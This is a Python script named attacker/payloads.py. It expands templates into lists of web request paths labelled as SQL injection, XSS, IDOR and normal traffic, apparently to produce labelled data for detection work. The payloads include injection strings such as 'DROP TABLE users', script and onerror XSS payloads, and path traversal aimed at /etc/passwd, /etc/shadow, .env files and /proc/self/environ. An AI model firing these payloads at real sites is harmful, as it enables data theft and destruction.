# attacker/payloads.py  (expanded deterministic generator)
import itertools
import re

def deterministic_expand(templates, values):
    out = []
    for t in templates:
        keys = re.findall(r"\{(\w+)\}", t)
        if not keys:
            out.append(t)
            continue
        lists = [values.get(k, [""]) for k in keys]
        for combo in itertools.product(*lists):
            s = t
            for k, v in zip(keys, combo):
                s = s.replace("{" + k + "}", str(v))
            out.append(s)
    return list(dict.fromkeys(out))

# values for placeholders (expanded)
VALUES = {
    "num": ["1", "2", "3", "4", "5", "10", "42", "1337", "9999", "' OR '1'='1", "0=0", "sleep(5)"],
    "id": ["1", "2", "3", "4", "10", "42", "101", "1337", "9999"],
    "file": [
        "../../etc/passwd", "/etc/passwd", "/app/config.json",
        "backup.tar.gz", "config.yaml", "/var/www/html/.env",
        "/proc/self/environ", "/etc/shadow"
    ],
    "name": ["alice", "bob", "charlie"]
}

# SQLi templates (more variants)
sqli_templates = [
    "/?id=1 OR 1=1",
    "/?id=1; DROP TABLE users; --",
    "/?search=1' OR '1'='1",
    "/?q=' OR '1'='1' --",
    "/?id={num} UNION SELECT null,null--",
    "/login?user=admin' -- &pass=anything",
    "/?id={num} OR sleep(5)--",
    "/product?id={num}' OR '1'='1",
    "/catalog?cat=1 OR 1=1--",
    "/?q=1'); SELECT * FROM users; --",
    "/?id={num}/*comment*/OR/*x*/1=1",
    "/filter?price=0 OR 1=1",
    "/search?term=' OR sleep(5)--"
]
sqli = deterministic_expand(sqli_templates, VALUES)

# XSS templates (more variants)
xss_templates = [
    "/?q=<script>alert(1)</script>",
    "/?q=\"><script>alert(1)</script>",
    "/?name=<img src=x onerror=alert(1)>",
    "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "/?q=<svg/onload=alert(1)>",
    "/?q=<iframe src='javascript:alert(1)'></iframe>",
    "/?comment=<b onmouseover=alert(1)>hover</b>",
    "/?title=<img src=x onerror=alert(1)>",
    "/?msg=<script>console.log(1)</script>"
]
xss = deterministic_expand(xss_templates, VALUES)

# IDOR templates (expanded)
idor_templates = [
    "/rest/user/{id}",
    "/api/v1/account/{id}",
    "/download?file={file}",
    "/profile/{id}/settings",
    "/orders/{id}/details",
    "/invoices/{id}/download",
    "/users/{id}/avatar",
    "/admin/user/{id}/impersonate"
]
idor = deterministic_expand(idor_templates, VALUES)

# NORMAL traffic (~220) — expanded deterministic
normal_templates = [
    "/", "/home", "/about", "/contact", "/login", "/logout",
    "/products", "/products?page={num}", "/search?q=phone",
    "/search?q=phone&sort=asc", "/static/logo.png", "/robots.txt",
    "/api/ping", "/health", "/status", "/docs", "/terms", "/privacy",
    "/blog", "/blog?page={num}", "/category/{num}", "/sitemap.xml",
    "/css/style.css", "/js/app.js"
]
normal = deterministic_expand(normal_templates, VALUES)
# append more paged variations
for i in range(1, 201):
    normal.append(f"/products?page={i}")
    normal.append(f"/blog?page={i}")
# unique and cutoff
normal = list(dict.fromkeys(normal))[:240]

PAYLOADS = {
    "sqli": sqli,
    "xss": xss,
    "idor": idor,
    "normal": normal
}

if __name__ == "__main__":
    print({k: len(v) for k, v in PAYLOADS.items()})

